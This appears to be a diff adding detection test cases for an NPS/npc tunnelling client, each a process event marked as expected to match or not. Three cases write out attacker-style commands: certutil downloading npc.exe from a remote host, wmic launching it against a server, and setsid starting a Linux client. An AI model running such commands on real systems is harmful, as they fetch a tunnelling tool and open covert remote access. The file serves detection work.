@@ -1,0 +1,5 @@
+{"name": "certutil fetches npc from the bridge", "expected": true, "event": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://192.0.2.10:44944/files/nps/npc_windows_amd64.exe C:\\Users\\Public\\npc.exe"}}
+{"name": "wmic starts npc with vkey auto", "expected": true, "event": {"Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "C:\\Windows\\System32\\wbem\\wmic.exe process call create \"C:\\Users\\Public\\npc.exe -server=192.0.2.10:44944 -vkey=auto\""}}
+{"name": "linux npc started with setsid", "expected": true, "event": {"Image": "/usr/bin/setsid", "CommandLine": "setsid /tmp/npc_linux_amd64 -server=192.0.2.10:8024 -vkey=auto"}}
+{"name": "near miss: npc with a real client key", "expected": false, "event": {"Image": "/opt/nps/npc", "CommandLine": "/opt/nps/npc -server=192.0.2.10:8024 -vkey=k3q9z1m0x7"}}
+{"name": "near miss: certutil fetching another file", "expected": false, "event": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -split -f http://192.0.2.10/files/setup.exe C:\\Temp\\setup.exe"}}
